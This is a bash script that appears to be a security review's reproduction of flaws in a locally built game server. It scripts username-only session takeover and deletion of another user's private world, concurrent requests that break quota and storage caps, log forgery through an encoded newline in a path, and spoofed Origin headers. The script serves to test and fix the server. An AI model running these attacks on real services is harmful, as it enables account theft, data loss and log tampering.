#!/usr/bin/env bash
# R2 reviewer repro: attacks a throwaway local synthwild server (never production).
#   bash tools/review_b_server.sh
set -uo pipefail
HERE="$(cd "$(dirname "$0")/../server" && pwd)"
PORT="${PORT:-8131}"
BASE="http://127.0.0.1:$PORT"; P="/gms/3d/synthwild"
TMP="$(mktemp -d)"
cleanup() { [ -n "${SRV:-}" ] && kill "$SRV" 2>/dev/null; rm -rf "$TMP"; }
trap cleanup EXIT
(cd "$HERE" && CGO_ENABLED=0 go build -o "$TMP/sw" .) || exit 1
export SYNTHWILD_ADDR="127.0.0.1:$PORT" SYNTHWILD_DATA="$TMP/data" SYNTHWILD_INSECURE_COOKIE=1 \
       SYNTHWILD_PUBLIC_URL="$BASE$P" SYNTHWILD_GLOBAL_CAP=$((40*1024*1024)) GOMEMLIMIT=96MiB
"$TMP/sw" > "$TMP/log" 2>&1 & SRV=$!
for i in $(seq 1 50); do curl -sf "$BASE/api/health" >/dev/null && break; sleep 0.2; done
ip() { echo "10.$((RANDOM%250)).$((RANDOM%250)).$((RANDOM%250))"; }
c() { local j="$TMP/$1.jar"; shift; curl -sS -b "$j" -c "$j" -H "X-Forwarded-For: $(ip)" "$@"; }
J=(-H 'Content-Type: application/json')

# admin via the CLI link, then two kids
link=$("$TMP/sw" admin-link aaron@br8t.com 2>/dev/null)
c admin -o /dev/null "$link"
c admin "${J[@]}" -d '{"username":"alice","display":"Alice"}' "$BASE$P/api/admin/users" >/dev/null
c admin "${J[@]}" -d '{"username":"mallory"}' "$BASE$P/api/admin/users" >/dev/null
c alice "${J[@]}" -d '{"username":"alice"}' "$BASE$P/api/login" >/dev/null
c mal   "${J[@]}" -d '{"username":"mallory"}' "$BASE$P/api/login" >/dev/null

echo "== B1: public list leaks usernames, username is the only credential"
c alice "${J[@]}" -d '{"name":"Alice public","public":true}' "$BASE$P/api/worlds" >/dev/null
priv=$(c alice "${J[@]}" -d '{"name":"Alice SECRET"}' "$BASE$P/api/worlds" | python3 -c 'import sys,json;print(json.load(sys.stdin)["world"]["id"])')
owner=$(c mal "$BASE$P/api/worlds?scope=public" | python3 -c 'import sys,json;print(json.load(sys.stdin)["worlds"][0]["owner"])')
echo "  mallory harvested owner username from public list: $owner"
c steal "${J[@]}" -d "{\"username\":\"$owner\"}" "$BASE$P/api/login" >/dev/null
echo "  stolen session sees: $(c steal "$BASE$P/api/worlds?scope=mine" | python3 -c 'import sys,json;print([w["name"] for w in json.load(sys.stdin)["worlds"]])')"
echo "  DELETE alice's private world: $(c steal -o /dev/null -w '%{http_code}' -X DELETE "$BASE$P/api/worlds/$priv")"
echo "  alice's own session still valid (no notice): $(c alice "$BASE$P/api/me" | head -c 60)"

PQ=()
echo "== B2: 50-world quota race (60 concurrent creates)"
for i in $(seq 1 60); do c mal -o /dev/null "${J[@]}" -d "{\"name\":\"q$i\"}" "$BASE$P/api/worlds" & PQ+=($!); done; wait "${PQ[@]}"
echo "  mallory owns: $(c mal "$BASE$P/api/worlds?scope=mine" | python3 -c 'import sys,json;print(len(json.load(sys.stdin)["worlds"]))') worlds (limit 50)"

echo "== B3: global cap race (cap=40 MiB, 12 concurrent 7 MiB uploads to distinct worlds)"
head -c $((7*1024*1024)) /dev/urandom > "$TMP/big"
ids=$(c mal "$BASE$P/api/worlds?scope=mine" | python3 -c 'import sys,json;print(" ".join(w["id"] for w in json.load(sys.stdin)["worlds"][:12]))')
peak=0
( while kill -0 $SRV 2>/dev/null; do ps -o rss= -p $SRV; sleep 0.05; done ) > "$TMP/rss" &
MON=$!
PIDS=()
for id in $ids; do c mal -o /dev/null -w '%{http_code} ' -X PUT -H 'Content-Type: application/octet-stream' --data-binary @"$TMP/big" "$BASE$P/api/worlds/$id/blob?version=0" & PIDS+=($!); done; wait "${PIDS[@]}"; echo
kill $MON 2>/dev/null
python3 - "$TMP/data/synthwild.db" <<'PY'
import sqlite3,sys
d=sqlite3.connect(sys.argv[1]); s=d.execute("select sum(size+thumb_size) from worlds").fetchone()[0] or 0
print(f"  stored after race: {s/2**20:.1f} MiB vs cap 40 MiB")
PY
echo "  server peak RSS during the burst: $(sort -n "$TMP/rss" | tail -1 | awk '{printf "%.0f MiB", $1/1024}') (unit MemoryMax=192M)"

echo "== B4: log injection via encoded newline in the path"
curl -s -o /dev/null "$BASE$P/api/x%0a2026/10/02%2000:00:00%20POST%20/api/admin/users%20FORGED"
grep -n "FORGED" "$TMP/log" | sed 's/^/  /'

echo "== world_data cascade on delete"
python3 - "$TMP/data/synthwild.db" <<'PY'
import sqlite3,sys
d=sqlite3.connect(sys.argv[1])
print("  orphan world_data rows:", d.execute("select count(*) from world_data where world_id not in (select id from worlds)").fetchone()[0])
PY

echo "== Origin variants on POST /api/logout"
for o in "null" "https://files.br8t.com" "http://127.0.0.1:$PORT.evil.io"; do
  echo "  Origin: $o -> $(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Origin: $o" "$BASE$P/api/logout")"
done
echo "  no Origin -> $(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE$P/api/logout")"
